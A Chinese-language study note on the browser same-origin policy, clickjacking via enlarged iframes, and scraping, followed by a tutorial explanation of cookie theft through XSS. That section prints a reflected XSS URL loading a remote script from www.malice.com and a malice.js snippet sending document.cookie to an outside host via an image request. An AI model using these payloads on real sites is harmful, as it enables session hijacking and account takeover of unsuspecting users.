# 同源策略(浏览器的安全策略)
不能使用不同源的数据服务。防御大部分的攻击。但是表单提交、链接 这些项等同于切换页面 script标签的src、link标签的href、img标签的src、iframe标签的src 上述的资源可以引用，但是不可获取内容。

安全问题

例子1：普通的网络用户，不会去记域名等内容。如果我在我自己的页面内，嵌套一个并把他放大，不就和淘宝一模一样了？并且还会有淘宝的状态信息。这时候我们可以获取用户的密码、给用户创建订单、注销用户的账户等等有危害性的操作。例子2：领导说要一个腾讯新闻。嗯好，我们放大自适应。这时候，我们可以加点小广告，截获一些用户操作。分分钟不花钱。得到了一个腾讯新闻。

数据归属问题

大家都知道爬虫吧。想起来前几天在思否看到的头条（“饭友”APP 未经许可抓取微博数据，被判赔偿210万）。如果说没有同源策略，饭友直接 ajax 拉取微博数据。或许你可以说 referer 验证，在浏览器没有同源策略的情况下这些都可以绕过去。微博方看到的就是一个正常的微博用户，正常的ip，访问了他们的接口。那么爬虫呢？爬虫是主动触发的操作，是他们使用他们的ip，伪造成一个合理的用户，去抓取数据。

# 说说劫持 Cookie 的原理
[原文链接](https://juejin.cn/post/6844903813820710926)
1.首先先在存在 XSS 漏洞的网站，加载一段远程脚本，形如：
```
http://www.xxx.com/xxx.html?param="><script src=http://www.malice.com/malice.js></script>
```
XSS Payload 写在 malice.js 中，这样就可以避免直接在 URL 参数中写入大量的脚本代码。
malice.js 内容：
```
var img = document.createElement("img");
img.src = "http://xxx.com/log?" + escape(document.cookie);
document.body.appendChild(img);
```
escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。
在此，我们动态创建了一个图片标签，并把 cookie 参数作为对象，发送给后端服务器。

这样就完成了窃取 Cookie 的整个过程。

利用 Cookie 登陆账户
